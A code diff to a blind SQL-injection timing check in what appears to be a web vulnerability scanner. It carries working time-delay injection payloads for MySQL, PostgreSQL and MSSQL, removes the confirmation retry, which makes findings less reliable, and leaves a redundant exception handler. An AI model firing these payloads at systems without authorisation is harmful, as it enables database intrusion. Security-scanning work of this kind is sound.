@@ -11645,25 +11645,31 @@ def scan_sqli_error_pattern(crawl_data):
 
 
 def scan_blind_sqli_timing(crawl_data):
-    """Blind SQLi via timing — sends sleep payloads and measures response time differential."""
+    """Blind SQLi via timing — fast version with 1s sleep and smart param selection."""
     findings = []
     sleep_payloads = [
-        ("' OR SLEEP(3)-- -", 3),
-        ("' OR pg_sleep(3)-- -", 3),
-        ("'; WAITFOR DELAY '0:0:3'-- -", 3),
-        ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- -", 3),
+        ("' OR SLEEP(1)-- -", 1),
+        ("' OR pg_sleep(1)-- -", 1),
+        ("'; WAITFOR DELAY '0:0:1'-- -", 1),
     ]
 
-    for url, params in list(crawl_data.get("params", {}).items())[:15]:
-        for p in params[:3]:
-            # Baseline timing
+    # Only test params that look injectable (not all params)
+    injectable_hints = ["id", "user", "name", "search", "q", "query", "filter",
+                        "sort", "order", "page", "cat", "item", "product", "article"]
+
+    for url, params in list(crawl_data.get("params", {}).items())[:10]:
+        # Prioritize likely-injectable params
+        priority_params = [p for p in params if any(h in p.lower() for h in injectable_hints)]
+        test_params = (priority_params or params)[:2]
+
+        for p in test_params:
             parsed = urllib.parse.urlparse(url)
             qs = urllib.parse.parse_qs(parsed.query)
             try:
                 qs[p] = ["1"]
                 baseline_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                 t0 = time.time()
-                _S.get(baseline_url, timeout=_TIMEOUT)
+                _S.get(baseline_url, timeout=5)
                 baseline_time = time.time() - t0
             except Exception:
                 continue
@@ -11673,23 +11679,19 @@ def scan_blind_sqli_timing(crawl_data):
                 test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                 try:
                     t0 = time.time()
-                    _S.get(test_url, timeout=_TIMEOUT + expected_delay + 2)
+                    _S.get(test_url, timeout=5)
                     elapsed = time.time() - t0
-                    # If response took significantly longer than baseline + expected delay
-                    if elapsed >= baseline_time + expected_delay - 0.5:
-                        # Confirm with a second attempt
-                        t0 = time.time()
-                        _S.get(test_url, timeout=_TIMEOUT + expected_delay + 2)
-                        elapsed2 = time.time() - t0
-                        if elapsed2 >= baseline_time + expected_delay - 0.5:
-                            findings.append({
-                                "type": "Blind SQL Injection (Time-Based)",
-                                "severity": "critical",
-                                "url": test_url,
-                                "detail": f"Param '{p}' delays response by {elapsed:.1f}s (baseline: {baseline_time:.1f}s). Confirmed on retry: {elapsed2:.1f}s",
-                                "template": "apex-sqli-blind-time",
-                            })
-                            break
+                    if elapsed >= baseline_time + expected_delay - 0.3:
+                        findings.append({
+                            "type": "Blind SQL Injection (Time-Based)",
+                            "severity": "critical",
+                            "url": test_url,
+                            "detail": f"Param '{p}' delays {elapsed:.1f}s (baseline: {baseline_time:.1f}s). Payload: {payload[:30]}",
+                            "template": "apex-sqli-blind-time",
+                        })
+                        break
+                except Exception:
+                    continue
                 except Exception:
                     continue
     return findings
